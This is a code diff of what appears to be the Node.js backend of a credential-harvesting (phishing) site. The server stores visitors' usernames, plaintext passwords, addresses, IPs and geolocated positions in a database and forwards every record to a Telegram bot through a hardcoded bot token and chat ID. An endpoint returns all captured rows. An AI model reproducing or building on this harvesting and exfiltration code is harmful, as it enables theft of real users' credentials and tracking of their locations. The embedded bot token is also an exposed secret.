@@ -12,17 +12,24 @@ const pool = new Pool({
     ssl: { rejectUnauthorized: false }
 });
 
-pool.query(`CREATE TABLE IF NOT EXISTS records (
-    id SERIAL PRIMARY KEY,
-    type TEXT,
-    username TEXT,
-    password TEXT,
-    address TEXT,
-    ip TEXT,
-    location TEXT,
-    timestamp TEXT
-)`).then(() => console.log("✅ Supabase Connected"))
-   .catch(err => console.error("Table Error:", err.message));
+// Create or Update Table
+pool.query(`
+    CREATE TABLE IF NOT EXISTS records (
+        id SERIAL PRIMARY KEY,
+        type TEXT,
+        username TEXT,
+        password TEXT,
+        address TEXT,
+        ip TEXT,
+        location TEXT,
+        timestamp TEXT
+    )
+`).then(() => console.log("✅ Table Ready"))
+  .catch(err => console.error("Table Error:", err.message));
+
+// Add location column if it doesn't exist
+pool.query(`ALTER TABLE records ADD COLUMN IF NOT EXISTS location TEXT`)
+   .catch(() => {}); // Ignore if column already exists
 
 function getRealIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
@@ -36,7 +43,7 @@ const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
 const CHAT_ID = "8559945003";
 
 async function getLocation(ip) {
-    if (ip === 'Unknown') return 'Unknown Location';
+    if (ip === 'Unknown' || !ip) return 'Unknown Location';
     try {
         const res = await fetch(`https://ipapi.co/${ip}/json/`);
         const data = await res.json();
@@ -67,9 +74,8 @@ async function sendTelegramNotification(record) {
                 parse_mode: 'Markdown'
             })
         });
-        console.log("✅ Telegram sent!");
     } catch (err) {
-        console.error("❌ Telegram failed:", err.message);
+        console.error("Telegram failed:", err.message);
     }
 }
 
@@ -86,7 +92,6 @@ async function saveRecord(type, username = null, password = null, address = null
 
         console.log(`✅ SAVED: ${type} | IP: ${ip}`);
 
-        // Send notification for EVERY new record (Page Visit + Login)
         await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
@@ -119,6 +124,7 @@ app.get('/api/records', async (req, res) => {
         const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
         res.json(result.rows);
     } catch (err) {
+        console.error("Records fetch error:", err.message);
         res.json([]);
     }
 });
